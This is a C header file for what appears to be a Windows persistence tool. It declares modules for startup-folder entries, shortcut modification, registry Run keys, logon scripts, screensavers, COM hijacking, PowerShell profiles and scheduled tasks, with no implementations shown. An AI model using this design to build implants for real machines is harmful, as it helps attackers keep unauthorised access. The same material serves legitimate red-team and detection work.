#pragma once
#pragma comment (lib, "ole32.lib")
#pragma comment (lib, "uuid.lib")
#pragma comment (lib, "Shlwapi.lib")

#include <windows.h>
#include <shlwapi.h>
#include <stdio.h>
#include <wchar.h>
#include <fileapi.h>
#include <handleapi.h>
#include <Shlobj.h>
#include <io.h>

#include <winbase.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>

#define VERSION "v0.1"
#define	MAX_CLSID_LEN 38
#define	MAX_REGVALUENAME_LEN 16383
#define MAX_REGKEY_LEN 255
#define	BUFFLINE 1024
#define SIZE_BUFFER 512

typedef struct	S_args
{
	wchar_t* modules;
	wchar_t	filePath[MAX_PATH];
	wchar_t* fileName;

} S_args;

typedef struct S_lcom
{
	char* processName;
	char* clsid;
	struct S_lcom* next;
} S_lcom;

void	StartupFolder(S_args* params);
void	ShortcutModif(S_args* params);
void	RegRunKeys(S_args* params);
void	setRegVal(S_args* params, PHKEY hKey, const wchar_t* regVal);
void	LogonScript(S_args* params);
void	Screensaver(S_args* params);
void	ComHijacking(S_args* params);
void	PsProfile(S_args* params);
void	SchTask(S_args* params);

typedef struct		modules
{
	const wchar_t* mName;
	void (*fctPtr)(S_args*);
} modules;

extern const modules mods[];
